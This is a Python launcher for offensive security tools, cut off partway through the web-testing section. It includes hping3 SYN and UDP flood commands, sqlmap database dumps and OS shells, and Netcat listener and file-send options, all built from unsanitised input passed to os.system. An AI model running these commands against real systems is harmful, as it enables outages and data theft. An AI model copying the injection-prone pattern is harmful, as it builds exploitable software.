#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Ultimate Ethical Hacking Toolkit - App.py
Author: Security Researcher
Version: 3.0
Description: 50+ Tools Integrated
For Educational Purposes Only
"""

import os
import sys
import time
import subprocess
import platform
import json
import threading
import socket
import requests
from datetime import datetime
from colorama import init, Fore, Style
import argparse

# Initialize colorama
init(autoreset=True)

class EthicalHackingToolkit:
    def __init__(self):
        self.version = "3.0"
        self.author = "Ethical Hacker"
        self.target = ""
        self.port = ""
        self.output_dir = "results"
        self.wordlist_dir = "wordlists"
        self.log_file = "toolkit.log"
        self.tools_installed = []
        
        # Create directories
        self.create_directories()
        
    def create_directories(self):
        """Create necessary directories"""
        dirs = [self.output_dir, self.wordlist_dir, "loot", "scans", "exploits"]
        for dir_name in dirs:
            if not os.path.exists(dir_name):
                os.makedirs(dir_name)
                print(f"{Fore.GREEN}[+] Created directory: {dir_name}")
                
    def print_banner(self):
        """Display banner without pyfiglet"""
        os.system('clear' if os.name == 'posix' else 'cls')
        banner = f"""
{Fore.RED}╔══════════════════════════════════════════════════════════╗
║     ULTIMATE ETHICAL HACKING TOOLKIT v{self.version}         ║
║         {Fore.YELLOW}50+ Tools - For Educational Use Only{Fore.RED}            ║
╚══════════════════════════════════════════════════════════╝{Fore.RESET}
        """
        print(banner)
        
    def main_menu(self):
        """Display main menu"""
        while True:
            self.print_banner()
            print(f"\n{Fore.CYAN}📌 MAIN MENU{Fore.RESET}")
            print(f"{Fore.GREEN}════════════════════════════════════════════════{Fore.RESET}")
            print(f"{Fore.WHITE}[1]  {Fore.YELLOW}📁 Information Gathering (OSINT)")
            print(f"{Fore.WHITE}[2]  {Fore.YELLOW}🌐 Network Scanning & Enumeration")
            print(f"{Fore.WHITE}[3]  {Fore.YELLOW}🔍 Vulnerability Analysis")
            print(f"{Fore.WHITE}[4]  {Fore.YELLOW}🌍 Web Application Testing")
            print(f"{Fore.WHITE}[5]  {Fore.YELLOW}🔐 Password Attacks & Cracking")
            print(f"{Fore.WHITE}[6]  {Fore.YELLOW}📡 Wireless Network Attacks")
            print(f"{Fore.WHITE}[7]  {Fore.YELLOW}🎭 Social Engineering Tools")
            print(f"{Fore.WHITE}[8]  {Fore.YELLOW}💣 Exploitation Framework")
            print(f"{Fore.WHITE}[9]  {Fore.YELLOW}🕵️ Sniffing & MITM Attacks")
            print(f"{Fore.WHITE}[10] {Fore.YELLOW}📱 Mobile Hacking Tools")
            print(f"{Fore.WHITE}[11] {Fore.YELLOW}🖥️ Post Exploitation")
            print(f"{Fore.WHITE}[12] {Fore.YELLOW}🔧 Database Assessment")
            print(f"{Fore.WHITE}[13] {Fore.YELLOW}☁️ Cloud Security Tools")
            print(f"{Fore.WHITE}[14] {Fore.YELLOW}🛡️ DoS & Stress Testing")
            print(f"{Fore.WHITE}[15] {Fore.YELLOW}🔬 Forensics Tools")
            print(f"{Fore.WHITE}[16] {Fore.YELLOW}📊 Reporting & Documentation")
            print(f"{Fore.WHITE}[17] {Fore.YELLOW}⚙️ Toolkit Management")
            print(f"{Fore.WHITE}[0]  {Fore.RED}❌ Exit{Fore.RESET}")
            print(f"{Fore.GREEN}════════════════════════════════════════════════{Fore.RESET}")
            
            if self.target:
                print(f"{Fore.CYAN}[✓] Current Target: {Fore.WHITE}{self.target}{Fore.RESET}")
            else:
                print(f"{Fore.RED}[!] No target set{Fore.RESET}")
                
            choice = input(f"\n{Fore.BLUE}[?] Select option: {Fore.RESET}")
            
            if choice == "0":
                self.exit_toolkit()
            elif choice == "1":
                self.osint_menu()
            elif choice == "2":
                self.network_menu()
            elif choice == "3":
                self.vuln_menu()
            elif choice == "4":
                self.web_menu()
            elif choice == "5":
                self.password_menu()
            elif choice == "6":
                self.wireless_menu()
            elif choice == "7":
                self.social_menu()
            elif choice == "8":
                self.exploit_menu()
            elif choice == "9":
                self.sniffing_menu()
            elif choice == "10":
                self.mobile_menu()
            elif choice == "11":
                self.post_exploit_menu()
            elif choice == "12":
                self.database_menu()
            elif choice == "13":
                self.cloud_menu()
            elif choice == "14":
                self.dos_menu()
            elif choice == "15":
                self.forensics_menu()
            elif choice == "16":
                self.reporting_menu()
            elif choice == "17":
                self.management_menu()
            else:
                print(f"{Fore.RED}[!] Invalid option{Fore.RESET}")
                time.sleep(1)
                
    # ==================== INFORMATION GATHERING ====================
    def osint_menu(self):
        """OSINT Tools Menu"""
        while True:
            self.print_banner()
            print(f"\n{Fore.CYAN}📁 INFORMATION GATHERING TOOLS{Fore.RESET}")
            print(f"{Fore.GREEN}════════════════════════════════════════════════{Fore.RESET}")
            
            tools = [
                ("1", "theHarvester - Email & Domain OSINT"),
                ("2", "Recon-ng - Full OSINT Framework"),
                ("3", "Maltego - Link Analysis"),
                ("4", "SpiderFoot - Automated OSINT"),
                ("5", "Sherlock - Username Search"),
                ("6", "PhoneInfoga - Phone Number OSINT"),
                ("7", "Hunter.io - Email Hunter"),
                ("8", "WhatWeb - Website Identifier"),
                ("9", "DNSrecon - DNS Enumeration"),
                ("10", "WPScan - WordPress Scanner"),
                ("11", "BuiltWith - Tech Stack Finder"),
                ("12", "Shodan - Internet Device Search"),
                ("13", "Censys - Attack Surface Search"),
                ("14", "ZoomEye - Cyber Space Search"),
                ("15", "Back to Main Menu")
            ]
            
            for num, name in tools:
                print(f"{Fore.WHITE}[{num}] {Fore.YELLOW}{name}{Fore.RESET}")
                
            choice = input(f"\n{Fore.BLUE}[?] Select OSINT tool: {Fore.RESET}")
            
            if choice == "15":
                break
            elif choice == "1":
                self.run_theharvester()
            elif choice == "2":
                self.run_reconng()
            elif choice == "3":
                self.run_maltego()
            elif choice == "4":
                self.run_spiderfoot()
            elif choice == "5":
                self.run_sherlock()
            elif choice == "6":
                self.run_phoneinfoga()
            elif choice == "7":
                self.run_hunter()
            elif choice == "8":
                self.run_whatweb()
            elif choice == "9":
                self.run_dnsrecon()
            elif choice == "10":
                self.run_wpscan()
            elif choice == "11":
                self.run_builtwith()
            elif choice == "12":
                self.run_shodan()
            elif choice == "13":
                self.run_censys()
            elif choice == "14":
                self.run_zoomeye()
                
    def run_theharvester(self):
        """Run theHarvester"""
        if not self.target:
            self.target = input(f"{Fore.BLUE}[?] Enter target domain: {Fore.RESET}")
            
        print(f"\n{Fore.YELLOW}[*] Running theHarvester on {self.target}...{Fore.RESET}")
        cmd = f"theharvester -d {self.target} -b google,bing,linkedin -f {self.output_dir}/theharvester_{self.target}.html"
        os.system(cmd)
        print(f"{Fore.GREEN}[+] Results saved to {self.output_dir}/theharvester_{self.target}.html{Fore.RESET}")
        input(f"\n{Fore.YELLOW}[*] Press Enter to continue...{Fore.RESET}")
        
    def run_reconng(self):
        """Run Recon-ng"""
        print(f"{Fore.YELLOW}[*] Starting Recon-ng...{Fore.RESET}")
        os.system("recon-ng")
        
    def run_maltego(self):
        """Run Maltego"""
        print(f"{Fore.YELLOW}[*] Starting Maltego...{Fore.RESET}")
        os.system("maltego &")
        
    def run_spiderfoot(self):
        """Run SpiderFoot"""
        print(f"{Fore.YELLOW}[*] Starting SpiderFoot...{Fore.RESET}")
        os.system("spiderfoot -l 127.0.0.1:5001 &")
        print(f"{Fore.GREEN}[+] SpiderFoot running on http://127.0.0.1:5001{Fore.RESET}")
        input(f"{Fore.YELLOW}[*] Press Enter to continue...{Fore.RESET}")
        
    def run_sherlock(self):
        """Run Sherlock"""
        username = input(f"{Fore.BLUE}[?] Enter username to search: {Fore.RESET}")
        print(f"{Fore.YELLOW}[*] Searching for {username}...{Fore.RESET}")
        os.system(f"sherlock {username}")
        input(f"{Fore.YELLOW}[*] Press Enter to continue...{Fore.RESET}")
        
    def run_phoneinfoga(self):
        """Run PhoneInfoga"""
        phone = input(f"{Fore.BLUE}[?] Enter phone number (with country code): {Fore.RESET}")
        print(f"{Fore.YELLOW}[*] Scanning {phone}...{Fore.RESET}")
        os.system(f"phoneinfoga -n {phone}")
        input(f"{Fore.YELLOW}[*] Press Enter to continue...{Fore.RESET}")
        
    def run_hunter(self):
        """Run Hunter.io"""
        if not self.target:
            self.target = input(f"{Fore.BLUE}[?] Enter domain: {Fore.RESET}")
            
        print(f"{Fore.YELLOW}[*] Searching emails for {self.target}...{Fore.RESET}")
        # Requires API key
        api_key = input(f"{Fore.BLUE}[?] Enter Hunter.io API key: {Fore.RESET}")
        cmd = f"curl 'https://api.hunter.io/v2/domain-search?domain={self.target}&api_key={api_key}'"
        os.system(cmd)
        input(f"{Fore.YELLOW}[*] Press Enter to continue...{Fore.RESET}")
        
    def run_whatweb(self):
        """Run WhatWeb"""
        if not self.target:
            self.target = input(f"{Fore.BLUE}[?] Enter target URL: {Fore.RESET}")
            
        print(f"{Fore.YELLOW}[*] Identifying technologies on {self.target}...{Fore.RESET}")
        os.system(f"whatweb -v {self.target}")
        input(f"{Fore.YELLOW}[*] Press Enter to continue...{Fore.RESET}")
        
    def run_dnsrecon(self):
        """Run DNSrecon"""
        if not self.target:
            self.target = input(f"{Fore.BLUE}[?] Enter domain: {Fore.RESET}")
            
        print(f"{Fore.YELLOW}[*] DNS enumeration on {self.target}...{Fore.RESET}")
        os.system(f"dnsrecon -d {self.target} -t std,brt")
        input(f"{Fore.YELLOW}[*] Press Enter to continue...{Fore.RESET}")
        
    def run_wpscan(self):
        """Run WPScan"""
        if not self.target:
            self.target = input(f"{Fore.BLUE}[?] Enter WordPress URL: {Fore.RESET}")
            
        print(f"{Fore.YELLOW}[*] Scanning WordPress site {self.target}...{Fore.RESET}")
        os.system(f"wpscan --url {self.target} -e vp,vt,dbe")
        input(f"{Fore.YELLOW}[*] Press Enter to continue...{Fore.RESET}")
        
    def run_builtwith(self):
        """Run BuiltWith"""
        if not self.target:
            self.target = input(f"{Fore.BLUE}[?] Enter URL: {Fore.RESET}")
            
        print(f"{Fore.YELLOW}[*] Checking technologies on {self.target}...{Fore.RESET}")
        cmd = f"curl 'https://api.builtwith.com/v20/api.json?KEY=YOUR_API_KEY&LOOKUP={self.target}'"
        os.system(cmd)
        input(f"{Fore.YELLOW}[*] Press Enter to continue...{Fore.RESET}")
        
    def run_shodan(self):
        """Run Shodan search"""
        if not self.target:
            self.target = input(f"{Fore.BLUE}[?] Enter IP or domain: {Fore.RESET}")
            
        api_key = input(f"{Fore.BLUE}[?] Enter Shodan API key: {Fore.RESET}")
        print(f"{Fore.YELLOW}[*] Searching Shodan for {self.target}...{Fore.RESET}")
        os.system(f"shodan host {self.target}")
        input(f"{Fore.YELLOW}[*] Press Enter to continue...{Fore.RESET}")
        
    def run_censys(self):
        """Run Censys search"""
        if not self.target:
            self.target = input(f"{Fore.BLUE}[?] Enter IP: {Fore.RESET}")
            
        print(f"{Fore.YELLOW}[*] Searching Censys for {self.target}...{Fore.RESET}")
        # Requires API credentials
        os.system(f"censys search {self.target}")
        input(f"{Fore.YELLOW}[*] Press Enter to continue...{Fore.RESET}")
        
    def run_zoomeye(self):
        """Run ZoomEye search"""
        if not self.target:
            self.target = input(f"{Fore.BLUE}[?] Enter search query: {Fore.RESET}")
            
        print(f"{Fore.YELLOW}[*] Searching ZoomEye for {self.target}...{Fore.RESET}")
        os.system(f"zoomeye search {self.target}")
        input(f"{Fore.YELLOW}[*] Press Enter to continue...{Fore.RESET}")
        
    # ==================== NETWORK SCANNING ====================
    def network_menu(self):
        """Network Scanning Tools Menu"""
        while True:
            self.print_banner()
            print(f"\n{Fore.CYAN}🌐 NETWORK SCANNING TOOLS{Fore.RESET}")
            print(f"{Fore.GREEN}════════════════════════════════════════════════{Fore.RESET}")
            
            tools = [
                ("1", "Nmap - Port Scanner"),
                ("2", "Masscan - Mass IP Scanner"),
                ("3", "RustScan - Super Fast Scanner"),
                ("4", "Naabu - Fast Port Scanner"),
                ("5", "Httpx - HTTP Probe"),
                ("6", "Aquatone - Subdomain Discovery"),
                ("7", "Netcat - Swiss Army Knife"),
                ("8", "Zenmap - Nmap GUI"),
                ("9", "Angry IP Scanner"),
                ("10", "Advanced IP Scanner"),
                ("11", "Fping - Fast Ping Sweep"),
                ("12", "Hping3 - Packet Crafting"),
                ("13", "Arp-scan - ARP Scanner"),
                ("14", "Nbtscan - NetBIOS Scanner"),
                ("15", "Back to Main Menu")
            ]
            
            for num, name in tools:
                print(f"{Fore.WHITE}[{num}] {Fore.YELLOW}{name}{Fore.RESET}")
                
            choice = input(f"\n{Fore.BLUE}[?] Select network tool: {Fore.RESET}")
            
            if choice == "15":
                break
            elif choice == "1":
                self.run_nmap()
            elif choice == "2":
                self.run_masscan()
            elif choice == "3":
                self.run_rustscan()
            elif choice == "4":
                self.run_naabu()
            elif choice == "5":
                self.run_httpx()
            elif choice == "6":
                self.run_aquatone()
            elif choice == "7":
                self.run_netcat()
            elif choice == "8":
                self.run_zenmap()
            elif choice == "9":
                self.run_angryip()
            elif choice == "10":
                self.run_advip()
            elif choice == "11":
                self.run_fping()
            elif choice == "12":
                self.run_hping3()
            elif choice == "13":
                self.run_arpscan()
            elif choice == "14":
                self.run_nbtscan()
                
    def run_nmap(self):
        """Run Nmap scan"""
        if not self.target:
            self.target = input(f"{Fore.BLUE}[?] Enter target IP/range: {Fore.RESET}")
            
        print(f"\n{Fore.CYAN}Select scan type:{Fore.RESET}")
        print(f"{Fore.WHITE}[1] {Fore.YELLOW}Quick Scan")
        print(f"{Fore.WHITE}[2] {Fore.YELLOW}Full Port Scan")
        print(f"{Fore.WHITE}[3] {Fore.YELLOW}Service Version Detection")
        print(f"{Fore.WHITE}[4] {Fore.YELLOW}OS Detection")
        print(f"{Fore.WHITE}[5] {Fore.YELLOW}Aggressive Scan")
        print(f"{Fore.WHITE}[6] {Fore.YELLOW}UDP Scan")
        print(f"{Fore.WHITE}[7] {Fore.YELLOW}Ping Sweep")
        print(f"{Fore.WHITE}[8] {Fore.YELLOW}Custom Command{Fore.RESET}")
        
        scan_type = input(f"\n{Fore.BLUE}[?] Choose: {Fore.RESET}")
        
        scan_cmds = {
            "1": f"nmap -T4 -F {self.target}",
            "2": f"nmap -p- {self.target}",
            "3": f"nmap -sV {self.target}",
            "4": f"nmap -O {self.target}",
            "5": f"nmap -A {self.target}",
            "6": f"nmap -sU {self.target}",
            "7": f"nmap -sn {self.target}",
            "8": input(f"{Fore.BLUE}[?] Enter custom nmap command: {Fore.RESET}")
        }
        
        cmd = scan_cmds.get(scan_type, "")
        if cmd:
            output_file = f"{self.output_dir}/nmap_{self.target}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
            cmd += f" -oN {output_file}"
            
            print(f"{Fore.YELLOW}[*] Running: {cmd}{Fore.RESET}")
            os.system(cmd)
            print(f"{Fore.GREEN}[+] Results saved to {output_file}{Fore.RESET}")
            
        input(f"\n{Fore.YELLOW}[*] Press Enter to continue...{Fore.RESET}")
        
    def run_masscan(self):
        """Run Masscan"""
        if not self.target:
            self.target = input(f"{Fore.BLUE}[?] Enter target IP/range: {Fore.RESET}")
            
        ports = input(f"{Fore.BLUE}[?] Enter ports (e.g., 1-65535): {Fore.RESET}")
        rate = input(f"{Fore.BLUE}[?] Enter rate (packets/sec): {Fore.RESET}")
        
        cmd = f"masscan {self.target} -p{ports} --rate={rate}"
        output_file = f"{self.output_dir}/masscan_{self.target}.txt"
        cmd += f" -oJ {output_file}"
        
        print(f"{Fore.YELLOW}[*] Running masscan...{Fore.RESET}")
        os.system(cmd)
        print(f"{Fore.GREEN}[+] Results saved to {output_file}{Fore.RESET}")
        input(f"{Fore.YELLOW}[*] Press Enter to continue...{Fore.RESET}")
        
    def run_rustscan(self):
        """Run RustScan"""
        if not self.target:
            self.target = input(f"{Fore.BLUE}[?] Enter target: {Fore.RESET}")
            
        cmd = f"rustscan -a {self.target}"
        os.system(cmd)
        input(f"{Fore.YELLOW}[*] Press Enter to continue...{Fore.RESET}")
        
    def run_naabu(self):
        """Run Naabu"""
        if not self.target:
            self.target = input(f"{Fore.BLUE}[?] Enter target: {Fore.RESET}")
            
        cmd = f"naabu -host {self.target}"
        os.system(cmd)
        input(f"{Fore.YELLOW}[*] Press Enter to continue...{Fore.RESET}")
        
    def run_httpx(self):
        """Run HTTPx"""
        if not self.target:
            self.target = input(f"{Fore.BLUE}[?] Enter target: {Fore.RESET}")
            
        cmd = f"httpx -u {self.target}"
        os.system(cmd)
        input(f"{Fore.YELLOW}[*] Press Enter to continue...{Fore.RESET}")
        
    def run_aquatone(self):
        """Run Aquatone"""
        if not self.target:
            self.target = input(f"{Fore.BLUE}[?] Enter domain: {Fore.RESET}")
            
        cmd = f"echo {self.target} | aquatone"
        os.system(cmd)
        input(f"{Fore.YELLOW}[*] Press Enter to continue...{Fore.RESET}")
        
    def run_netcat(self):
        """Run Netcat"""
        print(f"{Fore.CYAN}Netcat Options:{Fore.RESET}")
        print(f"{Fore.WHITE}[1] {Fore.YELLOW}Port Scanner")
        print(f"{Fore.WHITE}[2] {Fore.YELLOW}Banner Grabbing")
        print(f"{Fore.WHITE}[3] {Fore.YELLOW}Reverse Shell (Listener)")
        print(f"{Fore.WHITE}[4] {Fore.YELLOW}File Transfer")
        
        nc_choice = input(f"\n{Fore.BLUE}[?] Choose: {Fore.RESET}")
        
        if nc_choice == "1":
            target = input(f"{Fore.BLUE}[?] Target: {Fore.RESET}")
            ports = input(f"{Fore.BLUE}[?] Port range (e.g., 1-1000): {Fore.RESET}")
            os.system(f"nc -zv {target} {ports}")
        elif nc_choice == "2":
            target = input(f"{Fore.BLUE}[?] Target: {Fore.RESET}")
            port = input(f"{Fore.BLUE}[?] Port: {Fore.RESET}")
            os.system(f"nc -v {target} {port}")
        elif nc_choice == "3":
            port = input(f"{Fore.BLUE}[?] Listen port: {Fore.RESET}")
            os.system(f"nc -lvnp {port}")
        elif nc_choice == "4":
            file = input(f"{Fore.BLUE}[?] File to send: {Fore.RESET}")
            target = input(f"{Fore.BLUE}[?] Target IP: {Fore.RESET}")
            port = input(f"{Fore.BLUE}[?] Target port: {Fore.RESET}")
            os.system(f"nc {target} {port} < {file}")
            
        input(f"{Fore.YELLOW}[*] Press Enter to continue...{Fore.RESET}")
        
    def run_zenmap(self):
        """Run Zenmap"""
        os.system("zenmap &")
        
    def run_angryip(self):
        """Run Angry IP Scanner"""
        os.system("ipscan &")
        
    def run_advip(self):
        """Run Advanced IP Scanner"""
        print(f"{Fore.YELLOW}[*] Download from: https://www.advanced-ip-scanner.com/{Fore.RESET}")
        input(f"{Fore.YELLOW}[*] Press Enter to continue...{Fore.RESET}")
        
    def run_fping(self):
        """Run fping"""
        if not self.target:
            self.target = input(f"{Fore.BLUE}[?] Enter subnet (e.g., 192.168.1.0/24): {Fore.RESET}")
            
        os.system(f"fping -a -g {self.target}")
        input(f"{Fore.YELLOW}[*] Press Enter to continue...{Fore.RESET}")
        
    def run_hping3(self):
        """Run hping3"""
        if not self.target:
            self.target = input(f"{Fore.BLUE}[?] Enter target: {Fore.RESET}")
            
        print(f"{Fore.CYAN}HPing3 Options:{Fore.RESET}")
        print(f"{Fore.WHITE}[1] {Fore.YELLOW}SYN Flood")
        print(f"{Fore.WHITE}[2] {Fore.YELLOW}ICMP Ping")
        print(f"{Fore.WHITE}[3] {Fore.YELLOW}UDP Flood")
        print(f"{Fore.WHITE}[4] {Fore.YELLOW}Custom{Fore.RESET}")
        
        h_choice = input(f"\n{Fore.BLUE}[?] Choose: {Fore.RESET}")
        
        if h_choice == "1":
            port = input(f"{Fore.BLUE}[?] Port: {Fore.RESET}")
            os.system(f"hping3 -S --flood -p {port} {self.target}")
        elif h_choice == "2":
            os.system(f"hping3 -1 {self.target}")
        elif h_choice == "3":
            port = input(f"{Fore.BLUE}[?] Port: {Fore.RESET}")
            os.system(f"hping3 -2 --flood -p {port} {self.target}")
        elif h_choice == "4":
            cmd = input(f"{Fore.BLUE}[?] Enter full hping3 command: {Fore.RESET}")
            os.system(cmd)
            
        input(f"{Fore.YELLOW}[*] Press Enter to continue...{Fore.RESET}")
        
    def run_arpscan(self):
        """Run arp-scan"""
        interface = input(f"{Fore.BLUE}[?] Enter interface (e.g., eth0): {Fore.RESET}")
        os.system(f"arp-scan --interface {interface} --localnet")
        input(f"{Fore.YELLOW}[*] Press Enter to continue...{Fore.RESET}")
        
    def run_nbtscan(self):
        """Run nbtscan"""
        if not self.target:
            self.target = input(f"{Fore.BLUE}[?] Enter subnet: {Fore.RESET}")
            
        os.system(f"nbtscan {self.target}")
        input(f"{Fore.YELLOW}[*] Press Enter to continue...{Fore.RESET}")
        
    # ==================== VULNERABILITY ANALYSIS ====================
    def vuln_menu(self):
        """Vulnerability Analysis Menu"""
        while True:
            self.print_banner()
            print(f"\n{Fore.CYAN}🔍 VULNERABILITY SCANNERS{Fore.RESET}")
            print(f"{Fore.GREEN}════════════════════════════════════════════════{Fore.RESET}")
            
            tools = [
                ("1", "Nessus - Professional Scanner"),
                ("2", "OpenVAS - Open Source Scanner"),
                ("3", "Nexpose - Rapid7 Scanner"),
                ("4", "Nikto - Web Server Scanner"),
                ("5", "WPScan - WordPress Scanner"),
                ("6", "JoomScan - Joomla Scanner"),
                ("7", "Droopescan - Drupal Scanner"),
                ("8", "CMSmap - CMS Scanner"),
                ("9", "Skipfish - Web App Scanner"),
                ("10", "Arachni - Web Scanner"),
                ("11", "Vuls - Linux Scanner"),
                ("12", "Trivy - Container Scanner"),
                ("13", "Clair - Container Scanner"),
                ("14", "Back to Main Menu")
            ]
            
            for num, name in tools:
                print(f"{Fore.WHITE}[{num}] {Fore.YELLOW}{name}{Fore.RESET}")
                
            choice = input(f"\n{Fore.BLUE}[?] Select vulnerability scanner: {Fore.RESET}")
            
            if choice == "14":
                break
            elif choice == "1":
                self.run_nessus()
            elif choice == "2":
                self.run_openvas()
            elif choice == "3":
                self.run_nexpose()
            elif choice == "4":
                self.run_nikto()
            elif choice == "5":
                self.run_wpscan()
            elif choice == "6":
                self.run_joomscan()
            elif choice == "7":
                self.run_droopescan()
            elif choice == "8":
                self.run_cmsmap()
            elif choice == "9":
                self.run_skipfish()
            elif choice == "10":
                self.run_arachni()
            elif choice == "11":
                self.run_vuls()
            elif choice == "12":
                self.run_trivy()
            elif choice == "13":
                self.run_clair()
                
    def run_nessus(self):
        """Run Nessus"""
        print(f"{Fore.YELLOW}[*] Starting Nessus...{Fore.RESET}")
        os.system("systemctl start nessusd")
        print(f"{Fore.GREEN}[+] Nessus running on https://localhost:8834{Fore.RESET}")
        input(f"{Fore.YELLOW}[*] Press Enter to continue...{Fore.RESET}")
        
    def run_openvas(self):
        """Run OpenVAS"""
        print(f"{Fore.YELLOW}[*] Starting OpenVAS...{Fore.RESET}")
        os.system("gvm-start")
        print(f"{Fore.GREEN}[+] OpenVAS running on https://127.0.0.1:9392{Fore.RESET}")
        input(f"{Fore.YELLOW}[*] Press Enter to continue...{Fore.RESET}")
        
    def run_nexpose(self):
        """Run Nexpose"""
        print(f"{Fore.YELLOW}[*] Starting Nexpose...{Fore.RESET}")
        os.system("/opt/rapid7/nexpose/nsc.sh")
        print(f"{Fore.GREEN}[+] Nexpose running on https://localhost:3780{Fore.RESET}")
        input(f"{Fore.YELLOW}[*] Press Enter to continue...{Fore.RESET}")
        
    def run_nikto(self):
        """Run Nikto"""
        if not self.target:
            self.target = input(f"{Fore.BLUE}[?] Enter target URL: {Fore.RESET}")
            
        cmd = f"nikto -h {self.target}"
        output_file = f"{self.output_dir}/nikto_{self.target}.txt"
        cmd += f" -o {output_file}"
        
        print(f"{Fore.YELLOW}[*] Running Nikto scan...{Fore.RESET}")
        os.system(cmd)
        print(f"{Fore.GREEN}[+] Results saved to {output_file}{Fore.RESET}")
        input(f"{Fore.YELLOW}[*] Press Enter to continue...{Fore.RESET}")
        
    def run_joomscan(self):
        """Run JoomScan"""
        if not self.target:
            self.target = input(f"{Fore.BLUE}[?] Enter Joomla URL: {Fore.RESET}")
            
        os.system(f"joomscan -u {self.target}")
        input(f"{Fore.YELLOW}[*] Press Enter to continue...{Fore.RESET}")
        
    def run_droopescan(self):
        """Run Droopescan"""
        if not self.target:
            self.target = input(f"{Fore.BLUE}[?] Enter Drupal URL: {Fore.RESET}")
            
        os.system(f"droopescan scan drupal -u {self.target}")
        input(f"{Fore.YELLOW}[*] Press Enter to continue...{Fore.RESET}")
        
    def run_cmsmap(self):
        """Run CMSmap"""
        if not self.target:
            self.target = input(f"{Fore.BLUE}[?] Enter CMS URL: {Fore.RESET}")
            
        os.system(f"cmsmap {self.target}")
        input(f"{Fore.YELLOW}[*] Press Enter to continue...{Fore.RESET}")
        
    def run_skipfish(self):
        """Run Skipfish"""
        if not self.target:
            self.target = input(f"{Fore.BLUE}[?] Enter URL: {Fore.RESET}")
            
        output_dir = f"{self.output_dir}/skipfish_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
        os.system(f"skipfish -o {output_dir} {self.target}")
        print(f"{Fore.GREEN}[+] Results saved to {output_dir}{Fore.RESET}")
        input(f"{Fore.YELLOW}[*] Press Enter to continue...{Fore.RESET}")
        
    def run_arachni(self):
        """Run Arachni"""
        if not self.target:
            self.target = input(f"{Fore.BLUE}[?] Enter URL: {Fore.RESET}")
            
        output_file = f"{self.output_dir}/arachni_{self.target}.afr"
        os.system(f"arachni {self.target} --report-save-path={output_file}")
        input(f"{Fore.YELLOW}[*] Press Enter to continue...{Fore.RESET}")
        
    def run_vuls(self):
        """Run Vuls"""
        if not self.target:
            self.target = input(f"{Fore.BLUE}[?] Enter target: {Fore.RESET}")
            
        os.system(f"vuls scan {self.target}")
        input(f"{Fore.YELLOW}[*] Press Enter to continue...{Fore.RESET}")
        
    def run_trivy(self):
        """Run Trivy"""
        image = input(f"{Fore.BLUE}[?] Enter Docker image: {Fore.RESET}")
        os.system(f"trivy image {image}")
        input(f"{Fore.YELLOW}[*] Press Enter to continue...{Fore.RESET}")
        
    def run_clair(self):
        """Run Clair"""
        print(f"{Fore.YELLOW}[*] Starting Clair...{Fore.RESET}")
        os.system("clair")
        input(f"{Fore.YELLOW}[*] Press Enter to continue...{Fore.RESET}")
        
    # ==================== WEB APPLICATION TESTING ====================
    def web_menu(self):
        """Web Application Testing Menu"""
        while True:
            self.print_banner()
            print(f"\n{Fore.CYAN}🌍 WEB APPLICATION TESTING{Fore.RESET}")
            print(f"{Fore.GREEN}════════════════════════════════════════════════{Fore.RESET}")
            
            tools = [
                ("1", "Burp Suite - Web Proxy"),
                ("2", "OWASP ZAP - Web Scanner"),
                ("3", "SQLMap - SQL Injection"),
                ("4", "XSStrike - XSS Scanner"),
                ("5", "Dirb - Directory Buster"),
                ("6", "Gobuster - Directory/Subdomain"),
                ("7", "Dirsearch - Directory Scanner"),
                ("8", "WFuzz - Web Fuzzer"),
                ("9", "FFUF - Fast Fuzzer"),
                ("10", "Commix - Command Injection"),
                ("11", "NoSQLMap - NoSQL Injection"),
                ("12", "XSStrike - Advanced XSS"),
                ("13", "BeEF - Browser Exploitation"),
                ("14", "Back to Main Menu")
            ]
            
            for num, name in tools:
                print(f"{Fore.WHITE}[{num}] {Fore.YELLOW}{name}{Fore.RESET}")
                
            choice = input(f"\n{Fore.BLUE}[?] Select web tool: {Fore.RESET}")
            
            if choice == "14":
                break
            elif choice == "1":
                self.run_burp()
            elif choice == "2":
                self.run_zap()
            elif choice == "3":
                self.run_sqlmap()
            elif choice == "4":
                self.run_xsstrike()
            elif choice == "5":
                self.run_dirb()
            elif choice == "6":
                self.run_gobuster()
            elif choice == "7":
                self.run_dirsearch()
            elif choice == "8":
                self.run_wfuzz()
            elif choice == "9":
                self.run_ffuf()
            elif choice == "10":
                self.run_commix()
            elif choice == "11":
                self.run_nosqlmap()
            elif choice == "12":
                self.run_xsstrike_advanced()
            elif choice == "13":
                self.run_beef()
                
    def run_burp(self):
        """Run Burp Suite"""
        print(f"{Fore.YELLOW}[*] Starting Burp Suite...{Fore.RESET}")
        os.system("burpsuite &")
        
    def run_zap(self):
        """Run OWASP ZAP"""
        print(f"{Fore.YELLOW}[*] Starting OWASP ZAP...{Fore.RESET}")
        os.system("zaproxy &")
        
    def run_sqlmap(self):
        """Run SQLMap"""
        if not self.target:
            self.target = input(f"{Fore.BLUE}[?] Enter URL with parameter: {Fore.RESET}")
            
        print(f"\n{Fore.CYAN}SQLMap Options:{Fore.RESET}")
        print(f"{Fore.WHITE}[1] {Fore.YELLOW}Basic Scan")
        print(f"{Fore.WHITE}[2] {Fore.YELLOW}Get Databases")
        print(f"{Fore.WHITE}[3] {Fore.YELLOW}Get Tables")
        print(f"{Fore.WHITE}[4] {Fore.YELLOW}Dump Data")
        print(f"{Fore.WHITE}[5] {Fore.YELLOW}OS Shell")
        print(f"{Fore.WHITE}[6] {Fore.YELLOW}Custom{Fore.RESET}")
        
        sql_choice = input(f"\n{Fore.BLUE}[?] Choose: {Fore.RESET}")
        
        if sql_choice == "1":
            cmd = f"sqlmap -u {self.target} --batch"
        elif sql_choice == "2":
            cmd = f"sqlmap -u {self.target} --dbs --batch"
        elif sql_choice == "3":
            db = input(f"{Fore.BLUE}[?] Database name: {Fore.RESET}")
            cmd = f"sqlmap -u {self.target} -D {db} --tables --batch"
        elif sql_choice == "4":
            db = input(f"{Fore.BLUE}[?] Database name: {Fore.RESET}")
            table = input(f"{Fore.BLUE}[?] Table name: {Fore.RESET}")
            cmd = f"sqlmap -u {self.target} -D {db} -T {table} --dump --batch"
        elif sql_choice == "5":
            cmd = f"sqlmap -u {self.target} --os-shell --batch"
        elif sql_choice == "6":
            cmd = input(f"{Fore.BLUE}[?] Enter full SQLMap command: {Fore.RESET}")
        else:
            return
            
        os.system(cmd)
        input(f"{Fore.YELLOW}[*] Press Enter to continue...{Fore.RESET}")
        
    def run_xsstrike(self):
        """Run XSStrike"""
        if not self.target:
